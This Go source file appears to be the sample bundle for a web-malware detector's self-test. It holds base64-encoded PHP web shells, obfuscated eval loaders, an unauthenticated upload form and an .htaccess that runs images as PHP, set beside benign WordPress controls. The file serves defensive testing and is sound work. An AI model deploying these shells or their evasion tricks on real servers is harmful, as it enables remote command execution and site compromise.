package selftest

// samples is the bundle. Adversarial samples and benign controls live in one
// list so a change that improves detection at the cost of false positives
// fails the same run.
var samples = []Sample{
	{
		Name:        "webshell_request_eval",
		Ext:         ".php",
		Malicious:   true,
		Description: "PHP evaluating a request parameter, the shape of nearly every drop-in web shell",
		Encoded:     "PD9waHAgQGV2YWwoJF9QT1NUWydjbWQnXSk7ID8+Cg==",
	},
	{
		Name:        "webshell_assert_request",
		RealtimeGap: true,
		YaraGap:     true,
		Ext:         ".php",
		Malicious:   true,
		Description: "a legacy PHP string assertion, with the function name split to defeat literal matching",
		Encoded:     "PD9waHAgJGE9J2FzcycuJ2VydCc7ICRhKCRfUkVRVUVTVFsncSddKTsgPz4K",
	},
	{
		Name:        "obfuscated_base64_loader",
		RealtimeGap: true,
		YaraGap:     true,
		Ext:         ".php",
		Malicious:   true,
		Description: "a loader that builds base64_decode from fragments and evaluates the result",
		Encoded:     "PD9waHAgJGYgPSAnYmFzZScuJzY0X2RlJy4nY29kZSc7IEBldmFsKCRmKCdjM2x6ZEdWdEtDUmZSMFZVV3lkakoxMHBPdz09JykpOyA/Pgo=",
	},
	{
		Name:        "obfuscated_chr_builder",
		RealtimeGap: true,
		YaraGap:     true,
		Ext:         ".php",
		Malicious:   true,
		Description: "a request command passed to a callable function whose name is assembled with chr()",
		Encoded:     "PD9waHAgJHM9Y2hyKDExNSkuY2hyKDEyMSkuY2hyKDExNSkuY2hyKDExNikuY2hyKDEwMSkuY2hyKDEwOSk7ICRzKCRfR0VUWydjbWQnXSk7ID8+Cg==",
	},
	{
		Name:        "uploader_form",
		RealtimeGap: true,
		Ext:         ".php",
		Malicious:   true,
		Description: "an unauthenticated upload form that writes to a caller-supplied path",
		Encoded:     "PD9waHAgaWYoaXNzZXQoJF9GSUxFU1snZiddKSl7bW92ZV91cGxvYWRlZF9maWxlKCRfRklMRVNbJ2YnXVsndG1wX25hbWUnXSwgJF9QT1NUWydkZXN0J10pO30gPz4KPGZvcm0gbWV0aG9kPXBvc3QgZW5jdHlwZT1tdWx0aXBhcnQvZm9ybS1kYXRhPjxpbnB1dCB0eXBlPWZpbGUgbmFtZT1mPjxpbnB1dCB0eXBlPXN1Ym1pdD48L2Zvcm0+Cg==",
	},
	{
		Name:        "htaccess_php_in_uploads",
		Ext:         ".htaccess",
		Malicious:   true,
		Description: "an access file that makes image extensions execute as PHP",
		Encoded:     "QWRkVHlwZSBhcHBsaWNhdGlvbi94LWh0dHBkLXBocCAuanBnIC5wbmcKPEZpbGVzIH4gIlwuKGpwZ3xwbmcpJCI+ClNldEhhbmRsZXIgYXBwbGljYXRpb24veC1odHRwZC1waHAKPC9GaWxlcz4K",
	},
	{
		Name:        "benign_wordpress_plugin",
		Ext:         ".php",
		Malicious:   false,
		Description: "an ordinary WordPress plugin, present so a rule that fires here is caught",
		Encoded:     "PD9waHAKLyoKUGx1Z2luIE5hbWU6IEV4YW1wbGUgV2lkZ2V0CkRlc2NyaXB0aW9uOiBBZGRzIGEgd2lkZ2V0LgpWZXJzaW9uOiAxLjIuMAoqLwppZiAoIWRlZmluZWQoJ0FCU1BBVEgnKSkgeyBleGl0OyB9CmZ1bmN0aW9uIGV4YW1wbGVfd2lkZ2V0X3JlbmRlcigkYXR0cykgewogICAgJGF0dHMgPSBzaG9ydGNvZGVfYXR0cyhhcnJheSgndGl0bGUnID0+ICdIZWxsbycpLCAkYXR0cyk7CiAgICByZXR1cm4gJzxkaXYgY2xhc3M9ImV4YW1wbGUtd2lkZ2V0Ij4nIC4gZXNjX2h0bWwoJGF0dHNbJ3RpdGxlJ10pIC4gJzwvZGl2Pic7Cn0KYWRkX3Nob3J0Y29kZSgnZXhhbXBsZV93aWRnZXQnLCAnZXhhbXBsZV93aWRnZXRfcmVuZGVyJyk7Cg==",
	},
	{
		Name:        "benign_base64_asset",
		Ext:         ".php",
		Malicious:   false,
		Description: "legitimate base64_decode of an inline image, the classic false positive for obfuscation rules",
		Encoded:     "PD9waHAKLy8gSW5saW5lIGEgc21hbGwgdHJhbnNwYXJlbnQgUE5HIHNvIHRoZSBwYWdlIG5lZWRzIG5vIGV4dHJhIHJlcXVlc3QuCiRwaXhlbCA9IGJhc2U2NF9kZWNvZGUoJ2lWQk9SdzBLR2dvQUFBQU5TVWhFVWdBQUFBRUFBQUFCQ0FZQUFBQWZGY1NKQUFBQURVbEVRVlI0Mm1Oa1lQaGZEd0FDaHdHQTYwZTZrZ0FBQUFCSlJVNUVya0pnZ2c9PScpOwpoZWFkZXIoJ0NvbnRlbnQtVHlwZTogaW1hZ2UvcG5nJyk7CmVjaG8gJHBpeGVsOwo=",
	},
	{
		Name:        "benign_htaccess",
		Ext:         ".htaccess",
		Malicious:   false,
		Description: "the access file WordPress writes on install",
		Encoded:     "PElmTW9kdWxlIG1vZF9yZXdyaXRlLmM+ClJld3JpdGVFbmdpbmUgT24KUmV3cml0ZUJhc2UgLwpSZXdyaXRlUnVsZSBeaW5kZXhcLnBocCQgLSBbTF0KUmV3cml0ZUNvbmQgJXtSRVFVRVNUX0ZJTEVOQU1FfSAhLWYKUmV3cml0ZVJ1bGUgLiAvaW5kZXgucGhwIFtMXQo8L0lmTW9kdWxlPgo=",
	},
}
